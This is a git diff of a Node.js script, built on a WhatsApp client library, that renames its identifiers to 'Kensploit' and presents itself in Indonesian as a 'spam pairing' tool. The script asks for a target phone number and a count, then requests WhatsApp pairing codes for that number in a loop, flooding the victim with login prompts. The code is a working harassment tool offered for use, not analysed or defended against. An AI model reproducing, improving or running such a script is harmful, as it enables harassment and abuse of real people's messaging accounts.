@@ -13,7 +13,7 @@ const readline = require("readline");
         '\x1b[37m',
         '\x1b[90m' 
     ];
-    const xeonColor = color[Math.floor(Math.random() * color.length)];
+    const kensploitColor = color[Math.floor(Math.random() * color.length)];
 
 const xColor = '\x1b[0m';
 
@@ -22,9 +22,9 @@ const question = (text) => {
     return new Promise((resolve) => { rl.question(text, resolve) });
 };
 
-async function XeonProject() {
+async function Kensploit() {
     const { state } = await useMultiFileAuthState('./69/session');
-    const XeonBotInc = makeWASocket({
+    const KensploitPairing = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
         auth: state,
@@ -39,23 +39,23 @@ async function XeonProject() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
     try {
-        // Ask for phone number
-        const phoneNumber = await question(xeonColor + 'Target : ' + xColor);
         
-        // Request the desired number of pairing codes
-        const xeonCodes = parseInt(await question(xeonColor + 'Jumlah : '+ xColor));
+        const phoneNumber = await question(kensploitColor + 'Target : ' + xColor);
+        
+        
+        const KensploitCodes = parseInt(await question(kensploitColor + 'Jumlah : '+ xColor));
 
-        if (isNaN(xeonCodes) || xeonCodes <= 0) {
+        if (isNaN(KensploitCodes) || KensploitCodes <= 0) {
             console.log('example : 20.');
             return;
         }
 
-        // Get and display pairing code
-        for (let i = 0; i < xeonCodes; i++) {
+        
+        for (let i = 0; i < KensploitCodes; i++) {
             try {
-                let code = await XeonBotInc.requestPairingCode(phoneNumber);
+                let code = await KensploitPairing.requestPairingCode(phoneNumber);
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(xeonColor + `${phoneNumber} [${i + 1}/${xeonCodes}]`+ xColor);
+                console.log(kensploitColor + `${phoneNumber} [${i + 1}/${KensploitCodes}]`+ xColor);
             } catch (error) {
                 console.error('Error:', error.message);
             }
@@ -64,9 +64,9 @@ async function XeonProject() {
                  console.error('error') ;
 }
 
-    return XeonBotInc;
+    return KensploitPairing;
 }
-console.log(xeonColor + `BERHASIL LOGIN...
+console.log(kensploitColor + `BERHASIL LOGIN...
 KENSPLOIT SPAM PAIRING
 =========================
 IKUTI PERINTAH DI BAWAH
@@ -75,4 +75,4 @@ UNTUK MELAKUKAN SPAM
 => MASUKAN JUMLAH
 [ LAKUKAN PERINTAH DI ATAS SEKARANG ] ` + xColor);
 
-XeonProject();
+Kensploit();
